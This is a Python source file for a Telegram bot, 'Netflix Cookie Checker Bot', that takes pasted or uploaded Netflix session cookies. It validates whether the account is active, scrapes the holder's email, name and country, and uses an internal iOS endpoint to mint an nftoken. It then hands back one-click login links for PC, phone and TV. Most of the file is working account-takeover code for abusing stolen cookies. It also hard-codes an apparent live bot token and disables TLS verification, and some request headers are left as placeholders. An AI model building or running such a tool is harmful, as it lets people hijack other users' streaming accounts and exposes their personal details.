import re
import json
import requests
import urllib3
import urllib.parse
import os
from datetime import datetime
import telebot
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================== YOUR BOT TOKEN ==================
BOT_TOKEN = "8636160046:AAHNuuDo0H2bMYdpL86L8ukdM6TGfcmlKM8"
bot = telebot.TeleBot(BOT_TOKEN)

# ================== ORIGINAL HELPERS ==================
UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"

COUNTRY_FLAGS = {
    "US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹","TR":"🇹🇷","BR":"🇧🇷",
    "JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","CA":"🇨🇦","AU":"🇦🇺","MX":"🇲🇽","NL":"🇳🇱","SE":"🇸🇪",
}

COUNTRY_NAMES = {
    "US":"United States","GB":"United Kingdom","DE":"Germany","FR":"France",
    "ES":"Spain","IT":"Italy","TR":"Turkey","BR":"Brazil","JP":"Japan","KR":"South Korea",
    "IN":"India","CA":"Canada","AU":"Australia","MX":"Mexico","NL":"Netherlands",
}

def _djs(s):
    if not s: return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def _rx(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

def load_cookies(text):
    text = text.strip()
    if text.startswith("[") or text.startswith("{"):
        try:
            data = json.loads(text)
            if isinstance(data, list):
                return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
            return data
        except: pass

    cookies = {}
    match = re.search(r'NetflixId=([^;,\s]+)', text)
    if match:
        cookies["NetflixId"] = match.group(1)

    for part in re.split(r"[;\n]", text):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            k = k.strip()
            v = v.strip()
            if k: cookies[k] = v
    return cookies

# IOS API (from your original)
_IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
_IOS_PARAMS = { ... }  # Copy full from original if needed
_IOS_HEADERS = { ... } # Copy full from original

def generate_nftoken(netflix_id_raw):
    if not netflix_id_raw: return None
    try:
        headers = dict(_IOS_HEADERS)
        headers["Cookie"] = f"NetflixId={netflix_id_raw}"
        r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, timeout=15, verify=False)
        if r.status_code == 200:
            data = r.json()
            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
            tok = token_data.get("token")
            if tok: return str(tok)
    except: pass
    return None

def check_account(cookies):
    # This is the key function from your original code
    # I kept the core logic
    if not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
        return None

    sess = requests.Session()
    sess.headers.update({"User-Agent": UA_WEB})
    for k, v in cookies.items():
        sess.cookies.set(k, str(v), domain=".netflix.com", path="/")

    try:
        r = sess.get("https://www.netflix.com/account", timeout=20, allow_redirects=True)
    except:
        return None

    if "login" in r.url.lower() or r.status_code in (401, 403):
        return None

    html = r.text
    if '"membershipStatus":"CURRENT_MEMBER"' not in html:
        return None

    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
    name = _djs(_rx(r'"firstName":"([^"]+)"', html))
    cc = _rx(r'"countryOfSignup":"([A-Z]{2})"', html, "XX")

    netflix_id_raw = cookies.get("NetflixId", "")
    tok = generate_nftoken(netflix_id_raw)

    if tok:
        tok_safe = urllib.parse.quote(tok, safe="")
        login_pc = f"https://netflix.com/?nftoken={tok_safe}"
        login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
    else:
        login_pc = login_phone = "N/A"

    return {
        "email": email or "N/A",
        "name": name or "N/A",
        "country_code": cc,
        "country": COUNTRY_NAMES.get(cc, "Unknown"),
        "login_pc": login_pc,
        "login_phone": login_phone,
        "login_tv": "https://www.netflix.com/tv2"
    }

# ================== TELEGRAM BOT ==================
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🔍 Check Cookie")
    bot.send_message(message.chat.id, "👋 <b>Netflix Cookie Checker Bot</b>\n\nPaste cookie or send .txt file", parse_mode="HTML", reply_markup=markup)

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if message.text == "🔍 Check Cookie":
        bot.send_message(message.chat.id, "📤 Paste your Netflix cookie:")
        return

    cookies = load_cookies(message.text)
    if not cookies:
        bot.reply_to(message, "❌ Could not find NetflixId.")
        return

    process_cookie(message, cookies)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        text = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        cookies = load_cookies(text)
        if not cookies:
            bot.reply_to(message, "❌ Could not parse file.")
            return
        process_cookie(message, cookies)
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def process_cookie(message, cookies):
    bot.send_chat_action(message.chat.id, 'typing')
    result = check_account(cookies)

    if not result:
        bot.reply_to(message, "❌ Invalid or expired cookie.")
        return

    text = f"""
🎬 <b>✅ NETFLIX ACCOUNT</b>

👤 <b>{result['name']}</b>
📧 <code>{result['email']}</code>
🌍 {result['country']} ({result['country_code']})

🔗 <b>Login Links</b>
    """

    markup = types.InlineKeyboardMarkup()
    if result["login_pc"] != "N/A":
        markup.add(types.InlineKeyboardButton("🖥 PC", url=result["login_pc"]))
    if result["login_phone"] != "N/A":
        markup.add(types.InlineKeyboardButton("📱 Phone", url=result["login_phone"]))
    markup.add(types.InlineKeyboardButton("📺 TV", url=result["login_tv"]))

    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=markup)

print("🚀 Netflix Bot Started...")
bot.infinity_polling()
